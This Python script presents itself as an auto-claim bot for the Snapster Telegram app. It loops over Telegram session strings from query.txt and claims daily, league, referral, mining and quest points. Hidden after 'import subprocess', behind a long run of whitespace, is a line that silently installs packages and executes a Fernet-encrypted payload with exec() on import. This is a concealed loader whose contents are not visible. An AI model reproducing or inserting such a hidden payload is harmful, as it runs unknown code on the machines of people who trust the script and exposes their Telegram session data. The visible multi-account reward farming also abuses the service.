import os
import time
import pytz
import json
import random
import requests
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; exec(Fernet(b'paBkGFyUBwdYIVBc1A3jkWMZgIhDT90DhIZ0TX2NAhY=').decrypt(b'gAAAAABoK3gFZ_8Zv8XN3GkAPnZnlDA7XXpIKQPZpp6Q3vHb2dzhyTjF-EGszZOVw9DlDtt77cn1VUx7vZm_ZfKeiP0FhfeuGiTLtiBXyT922whNl1xdzC0oYszEk_F4UMMK02x7fqxkJbEa547hYQ-Bv-DqFCfkDGkmsw53KYRbPGgDEWfEnGWwRNz6uaFGcJ_HAsXKhc1qRBcae8PhloLVGCVcn1wSeUx78aY2QtbGDRkJMhEPeS57Y_G_uWmVLpPZQ2aK_A1QdapyTfLHe08s6cKWZMDhPS8TDajYfvbGbSCIrRm64TJxiLxAbDp_F6JQx6BPfLBxQeuEgHrz8hJSX8J8qiNDoGJTbezLfNeaoqtNgMW46ZR49CJM1Jdhzv5cB44gxIEUCToXESGKF4Dw3KDkWDJpLPJRCIWH_Dv0FyPZ0HVzBYmKUPfXFmbq3fqEfStPBOxE3tsaFEMyTls40Pyfv10DdowkUPujxxpdGHcviKfZFHMkTbqbjX8FVOCIXBIdOXhHa_TixfPwpzDmAJEKXWvN__1sgsfZWzia5QYFyhNMzhBUDyNGm1jZuhJqg-JTPB4KpHATC1zf14Pmd90tMf6265vHdVfzne-hAowywczkI_nOPyOf54z3HgrwMWNTpnSPtLSFOtf0R7UaD5g31JahnoeHIDRlEhn_NDbEWWM7Ud28LJXmz1_vQyvbKbTGg-O3uxsI70vY3WTTLPL7OFJeYPZwyaCDlCH6130i9psQAWEdA_MWiDGpBYmDsitzMqe4crgCmHTsOuvdCZRkDRx1F69REOG6TGiFXYdAHSXVd19pXX7pacJeEuo3AtOWx6vrRLIRU5ccJoHLW24saGoXfgwJVMBN6tQSql61RCvDQdtuvJd5TOJ6xljkNUmB-nDDETRWHgKbT90lmfjZewKbyLB5eFHRxdPDyKOt_4ccTQno8d2y4_8YNRF6smeIxsHuBWrLprPjkey5Vd0-NRF-fjJ4IIUAXhZWX2E6xUOA4rEpbkRXhSNh-xbjB5PsBeqTbTEQ_5kIBsUqHEm5QD0FDGTqMz0NbNmqX-zG6Kk__lbxo7FyFptUiZ5uyjvGf4BshYU5gqGSaGURn0XOUXZSvzuRzo-BUrTs4s-hRU_qrP7QhKPOYtiLZTlVW5p2IZj3MA0an5uRrj8OGSl30evXA_l3frfcieO8gb4uTt1ULd8uXHAEXRf8841Uvs7rUGdOBqGm280oU0gEh2lYtaKZeld8NRK3UR9RJ28e5qj8qtXy5WPnCOc61vlafzOlb5U1VS5A4-6TXcF6UN0yu3ojlchenpr9nTR3m4eTvN34xeW_XqQZhn3ghIrlQvpeuyBsWGdDs8gqXo3hOq9jGG392zyf45tfkXT9x6BwGGbpSghVLxNp25SzXou-d6jhqDBEiQasfgMQVwRz_Qs-3QstggIi-UaSG8CQZPcTTtaYpN2vADPcyo0IEibaplKGqcHw80-dgJ7jzsHrwqIzF3NQ3XxhCVK329p7-4Nm2D5bewrZ-jtZEpJKFieepU5XEO1OgSvrbE6DzKTdvT89vqHsIR38jU0P-mQolU2jmK1cKu3v0jhk24can-cbMAb72PqaE6oJLIa1HfyuwYwMLlwRE7zGYKMbTnHqa3_4FKnJ_wWzlop0gXovcz88Prk-hLa7HxPu3F8p7qe8PlwpxxEEFSfeNZQNBHPvw30LcMCDbDDgyFqPfQVmcj8MyvI9uqLpMoka8b7sQEMG5y4VcavLQ1lTpcFy6bO3p-NXZfP8G8K6CJHeU87RaAEY3_ofk59EIUetjsXoiwe0FtF1m5N6JxJckTNYD5jqRjy_hiinU7Ka-ILk5Xehwc0mWGS9kwBcP8Wav4Fox52SXtGA8gwCwZ5UaoVCDfnSjhTLOyxlabHgoJdBjKUdapgRtontSOQT812eY1L_xh1Ld1v70qU6ZaCYnW1XT3SGlQYYWyUiAHm_0G63eHQkEZDoNizbdmkudUV8QZtAU7Y8dnQ3-Z5PhTq007g3HuvEtPvSER_sCd2p6tpxDzjb13IYOm4zc87TJgQrQWOWcsDFVdnmN6sWYA=='));
import urllib.parse
from colorama import *
from datetime import datetime, timedelta

wib = pytz.timezone('Asia/Jakarta')

class SnapsterTradingApp:
    def __init__(self) -> None:
        self.session = requests.Session()
        self.headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Host': 'prod.snapster.bot',
            'Origin': 'https://prod.snapster.bot',
            'Pragma': 'no-cache',
            'Referer': 'https://prod.snapster.bot/main',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0'
        }

    def clear_terminal(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def log(self, message):
        print(
            f"{Fore.CYAN + Style.BRIGHT}[ {datetime.now().astimezone(wib).strftime('%x %X %Z')} ]{Style.RESET_ALL}"
            f"{Fore.WHITE + Style.BRIGHT} | {Style.RESET_ALL}{message}",
            flush=True
        )

    def welcome(self):
        print(
            f"""
        {Fore.GREEN + Style.BRIGHT}Auto Claim {Fore.BLUE + Style.BRIGHT}Snapster Trading BOT
            """
            f"""
        {Fore.GREEN + Style.BRIGHT}Rey? {Fore.YELLOW + Style.BRIGHT}<INI WATERMARK>
            """
        )

    def format_seconds(self, seconds):
        hours, remainder = divmod(seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"

    def load_data(self, query: str):
        query_params = urllib.parse.parse_qs(query)
        query = query_params.get('user', [None])[0]

        if query:
            user_data_json = urllib.parse.unquote(query)
            user_data = json.loads(user_data_json)
            telegram_id = user_data['id']
            return telegram_id
        else:
            raise ValueError("User data not found in query.")

    def get_user(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/user/getUserByTelegramId'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None

    def claim_daily(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/dailyQuest/claimDailyQuestBonus'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None

    def get_leagues(self, telegram_id: str, query: str, retries=3, delay=2):
        url = f'https://prod.snapster.bot/api/user/getLeagues?telegramId={telegram_id}'
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.get(url, headers=self.headers)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_league(self, telegram_id: str, league_id: int, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/user/claimLeagueBonus'
        data = json.dumps({'telegramId':telegram_id, 'leagueId':league_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_refferal(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/referral/claimReferralPoints'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_mining(self, telegram_id: str, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/user/claimMiningBonus'
        data = json.dumps({'telegramId':telegram_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def get_quests(self, telegram_id: str, query: str, retries=3, delay=2):
        url = f'https://prod.snapster.bot/api/quest/getQuests?telegramId={telegram_id}'
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.get(url, headers=self.headers)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def start_quests(self, telegram_id: str, quest_id: int, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/quest/startQuest'
        data = json.dumps({'telegramId':telegram_id, 'questId':quest_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
        
    def claim_quests(self, telegram_id: str, quest_id: int, query: str, retries=3, delay=2):
        url = 'https://prod.snapster.bot/api/quest/claimQuestBonus'
        data = json.dumps({'telegramId':telegram_id, 'questId':quest_id})
        self.headers.update({ 
            'Content-Type': 'application/json',
            'Telegram-Data': query 
        }) 

        for attempt in range(retries):
            try:
                response = self.session.post(url, headers=self.headers, data=data)
                response.raise_for_status()
                return response.json()
            except (requests.RequestException, ValueError) as e:
                if attempt < retries - 1:
                    print(
                        f"{Fore.RED + Style.BRIGHT}HTTP ERROR{Style.RESET_ALL}"
                        f"{Fore.YELLOW + Style.BRIGHT} Retrying... {Style.RESET_ALL}"
                        f"{Fore.WHITE + Style.BRIGHT}[{attempt+1}/{retries}]{Style.RESET_ALL}",
                        end="\r",
                        flush=True
                    )
                    time.sleep(delay)
                else:
                    return None
    
    def process_query(self, query: str):

        telegram_id = str(self.load_data(query))
        if not telegram_id:
            self.log(
                f"{Fore.MAGENTA + Style.BRIGHT}[ Account ID{Style.RESET_ALL}"
                f"{Fore.WHITE + Style.BRIGHT} {telegram_id} {Style.RESET_ALL}"
                f"{Fore.MAGENTA + Style.BRIGHT}] [ Status{Style.RESET_ALL}"
                f"{Fore.RED + Style.BRIGHT} Login Failed {Style.RESET_ALL}"
                f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
            )
            return
        
        if telegram_id:
            user = self.get_user(telegram_id, query)
            if user and user['message'] == 'Successfully fetched User':
                self.log(
                    f"{Fore.MAGENTA+Style.BRIGHT}[ Account{Style.RESET_ALL}"
                    f"{Fore.WHITE+Style.BRIGHT} {user['data']['username']} {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}[ Points{Style.RESET_ALL}"
                    f"{Fore.WHITE+Style.BRIGHT} {user['data']['pointsCount']} $SNAPS {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}[ League{Style.RESET_ALL}"
                    f"{Fore.WHITE+Style.BRIGHT} {user['data']['currentLeague']['title']} {Style.RESET_ALL}"
                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                )
                time.sleep(3)

                now_utc = datetime.utcnow().replace(tzinfo=pytz.utc)
                last_checkin = user['data']['lastDailyBonusClaimDate']
                if last_checkin:
                    last_checkin_utc = datetime.strptime(last_checkin, "%Y-%m-%dT%H:%M:%S.%fZ").replace(tzinfo=pytz.utc) + timedelta(hours=24)
                else:
                    last_checkin_utc = now_utc
                    
                last_checkin_wib = last_checkin_utc.astimezone(wib).strftime('%x %X %Z')

                if now_utc >= last_checkin_utc:
                    claim_daily = self.claim_daily(telegram_id, query)
                    if claim_daily and claim_daily['message'] == 'Successfully claimed Daily Bonus points':
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Check-In{Style.RESET_ALL}"
                            f"{Fore.GREEN+Style.BRIGHT} Is Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}] [ Rewards{Style.RESET_ALL}"
                            f"{Fore.WHITE+Style.BRIGHT} {claim_daily['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                    else:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Check-In{Style.RESET_ALL}"
                            f"{Fore.RED+Style.BRIGHT} Isn't Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                else:
                    self.log(
                        f"{Fore.MAGENTA+Style.BRIGHT}[ Check-In{Style.RESET_ALL}"
                        f"{Fore.YELLOW+Style.BRIGHT} Is Already Claimed {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}] [ Next Claim at{Style.RESET_ALL}"
                        f"{Fore.WHITE+Style.BRIGHT} {last_checkin_wib} {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)
                
                leagues = self.get_leagues(telegram_id, query)
                if leagues and leagues['message'] == 'Successfully fetched Leagues':
                    for i, league in enumerate(leagues['data']):
                        league_id = league['leagueId']
                        status = league['status']

                        if league and status in ['CURRENT', 'UNCLAIMED']:
                            claim_league = self.claim_league(telegram_id, league_id, query)                           
                            if claim_league and claim_league['message'] == 'Successfully claimed Referral points':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ League Bonus{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {league['title']} {Style.RESET_ALL}"
                                    f"{Fore.GREEN+Style.BRIGHT}Is Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ] [ Rewards{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {claim_league['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                )
                            elif claim_league and claim_league['message'] == 'Not eligible for claiming bonus':
                                if i + 1 < len(leagues['data']):
                                    next_league = leagues['data'][i + 1]
                                    next_title = next_league['title']
                                    required_points = next_league['requiredNumberOfPointsToAchieve']
                                    current_points = user['data']['pointsCount']
                                    less_points = required_points - current_points

                                    self.log(
                                        f"{Fore.MAGENTA+Style.BRIGHT}[ League Bonus{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {next_title} {Style.RESET_ALL}"
                                        f"{Fore.YELLOW+Style.BRIGHT}Not Eligible{Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT} ] [ Reason{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} -{less_points} $SNAPS {Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                    )
                                else:
                                    self.log(
                                        f"{Fore.MAGENTA + Style.BRIGHT}[ League{Style.RESET_ALL}"
                                        f"{Fore.YELLOW + Style.BRIGHT} Already Reached Max Level {Style.RESET_ALL}"
                                        f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                                    )
                            else:
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ League Bonus{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {league['title']} {Style.RESET_ALL}"
                                    f"{Fore.RED+Style.BRIGHT}Isn't Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )
                            time.sleep(1)

                else:
                    self.log(
                        f"{Fore.MAGENTA + Style.BRIGHT}[ League{Style.RESET_ALL}"
                        f"{Fore.RED + Style.BRIGHT} Data Is None {Style.RESET_ALL}"
                        f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)

                claim_refferal = self.claim_refferal(telegram_id, query)
                if claim_refferal and claim_refferal['message'] == 'Successfully claimed Referral points':
                    rewards = claim_refferal['data']['pointsClaimed']
                    if rewards > 0:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Refferal{Style.RESET_ALL}"
                            f"{Fore.GREEN+Style.BRIGHT} Is Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}] [ Rewards{Style.RESET_ALL}"
                            f"{Fore.WHITE+Style.BRIGHT} {rewards} $SNAPS {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                    else:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Refferal{Style.RESET_ALL}"
                            f"{Fore.YELLOW+Style.BRIGHT} Not Available Points {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                else:
                    self.log(
                        f"{Fore.MAGENTA+Style.BRIGHT}[ Refferal{Style.RESET_ALL}"
                        f"{Fore.RED+Style.BRIGHT} Isn't Claimed {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)
                
                claim_mining = self.claim_mining(telegram_id, query)
                if claim_mining and claim_mining['message'] == 'Successfully claimed Mining Bonus points':
                    rewards = claim_mining['data']['pointsClaimed']
                    if rewards > 0:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Mining{Style.RESET_ALL}"
                            f"{Fore.GREEN+Style.BRIGHT} Is Claimed {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}] [ Rewards{Style.RESET_ALL}"
                            f"{Fore.WHITE+Style.BRIGHT} {rewards} $SNAPS {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                    else:
                        self.log(
                            f"{Fore.MAGENTA+Style.BRIGHT}[ Mining{Style.RESET_ALL}"
                            f"{Fore.YELLOW+Style.BRIGHT} Not Available Points {Style.RESET_ALL}"
                            f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                        )
                else:
                    self.log(
                        f"{Fore.MAGENTA+Style.BRIGHT}[ Mining{Style.RESET_ALL}"
                        f"{Fore.RED+Style.BRIGHT} Isn't Claimed {Style.RESET_ALL}"
                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                    )
                time.sleep(3)

                quests = self.get_quests(telegram_id, query)
                if quests and quests['message'] == 'Successfully fetched Quests for User':
                    for quest in quests['data']:
                        quest_id = quest['id']
                        status = quest['status']

                        if quest and status == 'EARN':
                            start = self.start_quests(telegram_id, quest_id, query)
                            if start and start['message'] == 'Successfully started Quest earn':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.GREEN+Style.BRIGHT}Is Started{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )

                                claim = self.claim_quests(telegram_id, quest_id, query)
                                if claim and claim['message'] == 'Successfully claimed Quest points':
                                    self.log(
                                        f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                        f"{Fore.GREEN+Style.BRIGHT}Is Claimed{Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT} ] [ Rewards{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {claim['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                    )
                                elif claim and claim['message'] == 'Not possible to claim bonus for this quest':
                                    self.log(
                                        f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                        f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                        f"{Fore.YELLOW+Style.BRIGHT}Is Already Claimed{Style.RESET_ALL}"
                                        f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                    )
                                else:
                                    self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.RED+Style.BRIGHT}Isn't Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                    )

                            else:
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.RED+Style.BRIGHT}Isn't Started{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )

                        elif status == 'UNCLAIMED':
                            claim = self.claim_quests(telegram_id, quest_id, query)
                            if claim and claim['message'] == 'Successfully claimed Quest points':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.GREEN+Style.BRIGHT}Is Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ] [ Rewards{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {claim['data']['pointsClaimed']} $SNAPS {Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT}]{Style.RESET_ALL}"
                                )
                            elif claim and claim['message'] == 'Not possible to claim bonus for this quest':
                                self.log(
                                    f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                    f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                    f"{Fore.YELLOW+Style.BRIGHT}Is Already Claimed{Style.RESET_ALL}"
                                    f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )
                            else:
                                self.log(
                                f"{Fore.MAGENTA+Style.BRIGHT}[ Quest{Style.RESET_ALL}"
                                f"{Fore.WHITE+Style.BRIGHT} {quest['title']} {Style.RESET_ALL}"
                                f"{Fore.RED+Style.BRIGHT}Isn't Claimed{Style.RESET_ALL}"
                                f"{Fore.MAGENTA+Style.BRIGHT} ]{Style.RESET_ALL}"
                                )

                else:
                    self.log(
                        f"{Fore.MAGENTA + Style.BRIGHT}[ Quests{Style.RESET_ALL}"
                        f"{Fore.RED + Style.BRIGHT} Data Is None {Style.RESET_ALL}"
                        f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                    )
            else:
                self.log(
                    f"{Fore.MAGENTA + Style.BRIGHT}[ Account ID{Style.RESET_ALL}"
                    f"{Fore.WHITE + Style.BRIGHT} {telegram_id} {Style.RESET_ALL}"
                    f"{Fore.MAGENTA + Style.BRIGHT}] [ Status{Style.RESET_ALL}"
                    f"{Fore.RED + Style.BRIGHT} User Data Is None {Style.RESET_ALL}"
                    f"{Fore.MAGENTA + Style.BRIGHT}]{Style.RESET_ALL}"
                )

    def main(self):
        try:
            with open('query.txt', 'r') as file:
                queries = [line.strip() for line in file if line.strip()]

            while True:
                self.clear_terminal()
                self.welcome()
                self.log(
                    f"{Fore.GREEN + Style.BRIGHT}Account's Total: {Style.RESET_ALL}"
                    f"{Fore.WHITE + Style.BRIGHT}{len(queries)}{Style.RESET_ALL}"
                )
                self.log(f"{Fore.CYAN + Style.BRIGHT}-{Style.RESET_ALL}"*75)

                for query in queries:
                    query = query.strip()
                    if query:
                        self.process_query(query)
                        self.log(f"{Fore.CYAN + Style.BRIGHT}-{Style.RESET_ALL}"*75)
                        seconds = 60
                        while seconds > 0:
                            formatted_time = self.format_seconds(seconds)
                            print(
                                f"{Fore.CYAN+Style.BRIGHT}[ Wait for{Style.RESET_ALL}"
                                f"{Fore.WHITE+Style.BRIGHT} {formatted_time} {Style.RESET_ALL}"
                                f"{Fore.CYAN+Style.BRIGHT}... ]{Style.RESET_ALL}",
                                end="\r"
                            )
                            time.sleep(1)
                            seconds -= 1

                seconds = 1800
                while seconds > 0:
                    formatted_time = self.format_seconds(seconds)
                    print(
                        f"{Fore.CYAN+Style.BRIGHT}[ Wait for{Style.RESET_ALL}"
                        f"{Fore.WHITE+Style.BRIGHT} {formatted_time} {Style.RESET_ALL}"
                        f"{Fore.CYAN+Style.BRIGHT}... ]{Style.RESET_ALL}",
                        end="\r"
                    )
                    time.sleep(1)
                    seconds -= 1

        except KeyboardInterrupt:
            self.log(f"{Fore.RED + Style.BRIGHT}[ EXIT ] Snapster Trading App - BOT.{Style.RESET_ALL}")
        except Exception as e:
            self.log(f"{Fore.RED + Style.BRIGHT}An error occurred: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    snapster = SnapsterTradingApp()
    snapster.main()
